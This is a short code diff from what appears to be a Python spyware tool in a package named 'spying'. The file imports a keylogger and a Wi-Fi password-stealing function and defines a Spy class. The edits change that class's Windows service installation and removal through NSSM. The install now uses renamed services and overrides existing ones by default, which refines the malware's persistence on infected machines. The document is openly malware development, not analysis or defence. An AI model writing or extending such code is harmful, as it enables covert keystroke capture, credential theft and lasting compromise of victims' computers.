@@ -4,7 +4,7 @@ from datetime import datetime
 from pathlib import Path
 from typing import Optional, Tuple, List
 from spying.consts import DEFAULT_VIDEO_AUDIO_NAME, DEFAULT_SCREENSHOT_NAME, NSSM_PATH, PROTECTED_FILES, PROTECTED_DIRS, \
-    SERVICE_PATHS, SERVICE_PATHS, PROJECT_NAME, OVIL_PATH, START_UP_FOLDER, ROOT_DIRECTORY
+    SERVICE_PATHS, SERVICE_PATHS, PROJECT_NAME, OVIL_PATH, START_UP_FOLDER, ROOT_DIRECTORY, SERVICE_NAME
 
 from spying.KeyLogger import KeyLogger
 from spying.Wifi import steal_passwords
@@ -384,9 +384,9 @@ class Spy:
         return remove_service(service_name, nssm_path)
 
     @staticmethod
-    def install_service(service_name: str = SERVICE_PATHS[0][0], service_path: str = SERVICE_PATHS[0][0],
+    def install_service(service_name: str = SERVICE_NAME+"1", service_path: str = SERVICE_PATHS[0][0],
                         nssm_path: str = NSSM_PATH, start: bool = True,
-                        override: bool = False, directory_path=None) -> str:
+                        override: bool = True, directory_path=None) -> str:
         """
         Installs the given service.
         :param: service_name: the name of the service to install.
@@ -401,11 +401,13 @@ class Spy:
         return install_service(service_name, service_path, nssm_path, start, override, directory_path)
 
     @staticmethod
-    def remove_services(services: List[str] = SERVICE_PATHS[0:1], nssm_path: str = NSSM_PATH) -> None:
+    def remove_services(services=None, nssm_path: str = NSSM_PATH) -> None:
         """
         Loop until it removes all the services
         Returns whether succeeded or not.
         """
+        if services is None:
+            services = [SERVICE_NAME + "1", SERVICE_NAME + "2"]
         return remove_services(services, nssm_path)
 
     @staticmethod
